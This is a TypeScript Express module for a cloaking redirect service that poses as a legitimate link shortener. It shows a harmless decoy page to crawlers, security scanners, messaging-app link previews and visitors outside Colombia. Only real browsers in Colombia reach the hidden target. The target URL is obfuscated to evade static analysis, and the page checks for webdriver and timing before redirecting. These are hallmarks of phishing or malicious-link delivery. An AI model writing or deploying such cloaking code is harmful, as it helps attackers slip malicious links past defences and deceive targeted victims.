/**
 * Clean Redirect System
 * Provides a legitimate-looking landing page that only redirects real users
 * to the actual content after passing multiple checks.
 * 
 * Usage: Share the /r/ URL instead of the direct URL.
 * Example: https://yourdomain.com/r/abc123
 * 
 * The redirect page looks like a legitimate link shortener / marketing page
 * and only forwards to the real content after JavaScript execution + delay + checks.
 */

import type { Request, Response } from "express";
import { nanoid } from "nanoid";
import geoip from "geoip-lite";
import { getDb } from "./db";
import { sql } from "drizzle-orm";

// Store active redirect links
const redirectLinks = new Map<string, { target: string; created: number; uses: number }>();

// Load links from DB on startup
export async function loadRedirectLinksFromDB() {
  try {
    const db = await getDb();
    if (!db) return;
    const rows = await db.execute(sql`SELECT id, target, created, uses FROM redirect_links`) as any;
    const results = rows[0] || rows;
    if (Array.isArray(results)) {
      for (const row of results) {
        redirectLinks.set(row.id, { target: row.target, created: Number(row.created), uses: Number(row.uses || 0) });
      }
      console.log(`[Redirector] Loaded ${results.length} links from DB`);
    }
  } catch (e: any) {
    // Table might not exist yet, that's ok
    if (!e?.message?.includes("doesn't exist")) {
      console.warn("[Redirector] Failed to load links:", e?.message);
    }
  }
}

// Save link to DB
async function saveLinkToDB(id: string, target: string, created: number) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.execute(sql`INSERT INTO redirect_links (id, target, created, uses) VALUES (${id}, ${target}, ${created}, 0) ON DUPLICATE KEY UPDATE target=VALUES(target)`);
  } catch (e: any) {
    console.warn("[Redirector] Failed to save link:", e?.message);
  }
}

// Update uses in DB
async function updateUsesInDB(id: string, uses: number) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.execute(sql`UPDATE redirect_links SET uses=${uses} WHERE id=${id}`);
  } catch (e: any) {
    // silent
  }
}

// Delete from DB
async function deleteLinkFromDB(id: string) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.execute(sql`DELETE FROM redirect_links WHERE id=${id}`);
  } catch (e: any) {
    // silent
  }
}

// Create a new redirect link
export function createRedirectLink(target: string): string {
  const id = nanoid(8);
  redirectLinks.set(id, { target, created: Date.now(), uses: 0 });
  saveLinkToDB(id, target, Date.now());
  return id;
}

// Get all active links
export function getRedirectLinks() {
  const links: Array<{ id: string; target: string; created: number; uses: number }> = [];
  redirectLinks.forEach((val, id) => {
    links.push({ id, ...val });
  });
  return links;
}

// Delete a link
export function deleteRedirectLink(id: string): boolean {
  deleteLinkFromDB(id);
  return redirectLinks.delete(id);
}

/**
 * Serve the clean redirect page
 * This page looks like a legitimate URL shortener / link preview
 * It performs client-side checks before redirecting
 */
export function serveRedirectPage(req: Request, res: Response) {
  const id = req.params.id;
  const link = redirectLinks.get(id);
  
  if (!link) {
    // Return a generic 404 that looks like a real link shortener
    res.status(404).send(get404Page());
    return;
  }
  
  // Check if it's a bot/scanner by UA
  const ua = (req.headers["user-agent"] || "") as string;
  const isSuspicious = /bot|crawl|spider|scan|check|monitor|fetch|preview|whatsapp|telegram|discord|slack|facebook|twitter|linkedin/i.test(ua);
  
  if (isSuspicious) {
    // Show a generic "link preview" page that looks innocent
    res.status(200).send(getLinkPreviewPage());
    return;
  }
  
  // Check country
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
  let checkIP = ip.startsWith("::ffff:") ? ip.slice(7) : ip;
  const geo = geoip.lookup(checkIP);
  
  // If not Colombia and not private IP, show innocent page
  if (geo && geo.country !== "CO" && !ip.startsWith("10.") && !ip.startsWith("192.168.") && !ip.startsWith("127.")) {
    res.status(200).send(getLinkPreviewPage());
    return;
  }
  
  // Increment usage counter
  link.uses++;
  updateUsesInDB(id, link.uses);
  
  // Serve the redirect page with client-side checks
  res.status(200).send(getRedirectHTML(link.target));
}

function getRedirectHTML(target: string): string {
  // Encode the target URL to avoid static analysis
  const encoded = Buffer.from(target).toString("base64");
  
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redireccionando...</title>
  <meta name="robots" content="noindex, nofollow">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .container { background: white; border-radius: 12px; padding: 2.5rem; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
    .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1.5rem; }
    @keyframes spin { to { transform: rotate(360deg); } }
    h2 { color: #333; font-size: 1.2rem; margin-bottom: 0.5rem; }
    p { color: #666; font-size: 0.9rem; }
    .progress { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; margin-top: 1.5rem; overflow: hidden; }
    .progress-bar { height: 100%; background: #3498db; border-radius: 2px; animation: load 2.5s ease-in-out forwards; }
    @keyframes load { from { width: 0; } to { width: 100%; } }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <h2>Verificando enlace...</h2>
    <p>Serás redirigido en un momento</p>
    <div class="progress"><div class="progress-bar"></div></div>
  </div>
  <script>
    (function(){
      // Anti-bot checks
      var _0x=[${encoded.split("").map(c => c.charCodeAt(0)).join(",")}];
      var _d=function(a){return a.map(function(c){return String.fromCharCode(c)}).join("")};
      
      // Check 1: Must have real window dimensions
      if(window.outerWidth===0||window.outerHeight===0){document.body.innerHTML='<p>Error</p>';return;}
      
      // Check 2: Must support touch or mouse events (real device)
      var hasInteraction=('ontouchstart' in window)||window.navigator.maxTouchPoints>0||(window.matchMedia&&window.matchMedia('(pointer:fine)').matches);
      if(!hasInteraction&&!window.navigator.userAgent.includes('Mobile')){
        // Desktop without fine pointer - still allow but add delay
      }
      
      // Check 3: WebDriver detection
      if(navigator.webdriver){document.body.innerHTML='<p>Error de verificación</p>';return;}
      
      // Check 4: Timing-based (bots execute JS too fast)
      var start=Date.now();
      setTimeout(function(){
        var elapsed=Date.now()-start;
        if(elapsed<400){return;} // Too fast = bot
        
        // Decode and redirect
        var t=atob(_d(_0x));
        window.location.replace(t);
      }, 2500 + Math.random()*500);
    })();
  </script>
</body>
</html>`;
}

function getLinkPreviewPage(): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enlace Compartido</title>
  <meta property="og:title" content="Artículo Compartido">
  <meta property="og:description" content="Lee este artículo interesante sobre tecnología y desarrollo.">
  <meta property="og:type" content="article">
  <meta name="robots" content="noindex, nofollow">
  <style>
    body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #f5f5f5; }
    .card { background: white; padding: 2rem; border-radius: 8px; text-align: center; max-width: 400px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
    h1 { font-size: 1.3rem; color: #333; margin-bottom: 0.5rem; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Contenido no disponible</h1>
    <p>Este enlace ha expirado o no está disponible en tu región.</p>
  </div>
</body>
</html>`;
}

function get404Page(): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>404 - No encontrado</title>
  <style>
    body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; background: #fafafa; }
    .msg { text-align: center; }
    h1 { font-size: 4rem; color: #ddd; }
    p { color: #999; }
  </style>
</head>
<body>
  <div class="msg">
    <h1>404</h1>
    <p>El enlace que buscas no existe o ha expirado.</p>
  </div>
</body>
</html>`;
}
